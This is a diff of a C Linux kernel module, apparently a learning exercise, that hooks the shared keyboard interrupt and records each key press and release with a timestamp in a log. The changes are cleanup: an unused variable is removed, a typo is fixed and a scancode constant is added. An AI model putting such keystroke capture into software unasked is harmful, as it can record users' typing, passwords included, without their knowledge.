@@ -28,7 +28,6 @@ struct key_map {
 	size_t			press_count;
 };
 
-static struct key_map		*key_caps;
 static struct key_map		*key_shift_left;
 static struct key_map		*key_shift_right;
 static bool			caps_lock;
@@ -40,7 +39,7 @@ enum e_key_event {
 
 // this structure describe a log entry
 // key : witch key this key refers to, it will point on key_table
-// timestamp : when this event occured
+// timestamp : when this event occurred
 // event : was it a press or a release ?
 
 struct key_log_entry {
@@ -178,8 +177,9 @@ static struct key_map key_table[] = {
 	(struct key_map){0x0, 0x0, 0, NULL, NULL, false, 0}
 };
 
-#define SCANCODE_ENTER 28
-#define SCANCODE_SPACE 57
+#define SCANCODE_ENTER	28
+#define SCANCODE_SPACE	57
+#define SCANCODE_CAPS	58
 
 static bool		key_ignore_caps(const struct key_map *key)
 {
@@ -311,14 +311,14 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 		key->pressed = (scancode & 0x80) == 0;
 		if (key->pressed)
 			key->press_count += 1;
-		if (scancode == 58)
+		if (scancode == SCANCODE_CAPS)
 			caps_lock = !caps_lock;
 		key_create_entry(key);
 		mutex_unlock(&key_log_lock);
 
 	} else {
 		pr_info("(scan: %3u) -> %s\n", scancode,
-		        ((scancode & 0x80) == 0 ? "pressed" : "released"));
+			((scancode & 0x80) == 0 ? "pressed" : "released"));
 	}
 	return IRQ_HANDLED;
 }
@@ -373,11 +373,10 @@ static int		__init hello_init(void)
 	pr_info(MODULE_NAME "init ! %lu\n", sizeof(struct key_log_entry));
 	key_full_log = NULL;
 	caps_lock = false;
-	key_caps = get_key(14);
 	key_shift_left = get_key(42);
 	key_shift_right = get_key(54);
 	ret = request_irq(KEYBOARD_IRQ, &key_handler, IRQF_SHARED, MODULE_NAME,
-		&key_handler);
+			  &key_handler);
 	if (ret < 0) {
 		pr_err("failed to request keyboard irq: %d\n", ret);
 		return ret;
